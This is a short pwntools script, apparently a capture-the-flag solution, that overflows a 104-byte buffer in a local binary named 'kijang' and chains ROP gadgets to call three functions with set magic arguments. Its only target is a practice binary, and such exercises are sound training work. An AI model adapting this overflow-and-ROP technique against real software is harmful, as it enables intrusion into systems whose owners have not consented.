from pwn import *

p = process('./kijang')
elf = context.binary = ELF('./kijang')

#0x0000000000401493 : pop rdi ; ret
pop_rdi = p64(0x0000000000401493)
#0x0000000000401491 : pop rsi ; pop r15 ; ret
pop_rsi = p64(0x0000000000401491)
#0x0000000000401248 : pop rdx ; ret
pop_rdx = p64(0x0000000000401248)
#0x0000000000401258: pop rcx; ret
pop_rcx = p64(0x0000000000401258)

#Guard Entry (1st jump)
#0x0000000000401262 <+5>:     mov    rbp,rsp
guard = p64(0x0000000000401261)

payload = b"a"*104
payload += pop_rdi
payload += p64(0xdeaddead)
payload += pop_rsi
payload += p64(0xcafecafe)
payload += p64(0x0)
payload += guard

# Rusa_1 Entry 2nd jump

payload += pop_rdi
payload += p64(0xdeadbeef)
payload += pop_rsi
payload += p64(0xfefacafe)
payload += p64(0x0)
payload += pop_rdx
payload += p64(0xcafedada)
payload += p64(0x0040129e)

# Pusat entry 3rd jump
payload += pop_rdi
payload += p64(0x1a2b3c4d)
payload += pop_rsi
payload += p64(0xdeadca77)
payload += p64(0x0)
payload += pop_rdx
payload += p64(0xca77caf3)
payload += pop_rcx
payload += p64(0xdeda8765)
payload += p64(0x004012f2)



p.recv()
p.sendline(payload)
p.interactive()


